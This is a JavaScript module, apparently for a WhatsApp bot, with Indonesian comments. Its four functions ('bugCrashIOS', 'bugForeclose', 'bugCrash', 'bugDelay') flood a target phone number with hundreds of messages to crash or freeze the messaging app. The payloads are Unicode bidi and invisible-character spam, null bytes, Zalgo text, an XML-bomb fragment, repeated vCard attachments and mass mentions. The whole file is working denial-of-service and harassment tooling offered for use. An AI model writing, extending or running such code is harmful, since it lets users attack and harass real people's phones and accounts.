// ==========================================
// UPDATE: BUG NOMOR - LEBIH SADIS & GACOR
// ==========================================

// 1. Mode CRASH iOS (Unicode Bidi Overload + Emoji Spam)
async function bugCrashIOS(sock, target) {
    const payload = '⁧'.repeat(1000) + '😭'.repeat(500) + '\u0000'.repeat(200);
    const loop = 300; 
    for (let i = 0; i < loop; i++) {
        await sock.sendMessage(target, { text: payload + ` [${i}]` });
        await new Promise(r => setTimeout(r, 50)); 
    }
}

// 2. Mode FORECLOSE (Invisible Character Flood + XML Bomb)
async function bugForeclose(sock, target) {
    const payload = '\u200E'.repeat(1500) + '<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "aaaaaaaaaa">]>'; 
    const loop = 250; 
    for (let i = 0; i < loop; i++) {
        await sock.sendMessage(target, { text: payload + ` [${i}]` });
        await new Promise(r => setTimeout(r, 40));
    }
}

// 3. Mode CRASH (Zalgo Text + Massive VCF Spam)
async function bugCrash(sock, target) {
    const zalgo = 'ḫ̸̢̛̹̝̠̋̊̆͒̐e̷̢̛̮̹̝̠̋̊̆͒̐l̷̢̛̮̹̝̠̋̊̆͒̐l̷̢̛̮̹̝̠̋̊̆͒̐ơ̷̢̮̹̝̠̋̊̆͒̐'.repeat(500); 
    const vcf = 'BEGIN:VCARD\nVERSION:3.0\nFN:XYREX\nTEL;TYPE=CELL:+6288888888888\nEND:VCARD';
    const loop = 300; 
    for (let i = 0; i < loop; i++) {
        await sock.sendMessage(target, { text: zalgo + ` [${i}]` });
        await sock.sendMessage(target, { document: Buffer.from(vcf), mimetype: 'text/vcard', fileName: `bomb${i}.vcf` });
        await new Promise(r => setTimeout(r, 60));
    }
}

// 4. Mode DELAY (Heavy Mention + Forward Loop)
async function bugDelay(sock, target) {
    const payload = 'MENTION_OVERLOAD '.repeat(1000);
    const loop = 200; 
    for (let i = 0; i < loop; i++) {
        await sock.sendMessage(target, { 
            text: payload, 
            mentions: [target] 
        });
        await new Promise(r => setTimeout(r, 100)); 
    }
}

module.exports = { bugCrashIOS, bugForeclose, bugCrash, bugDelay };
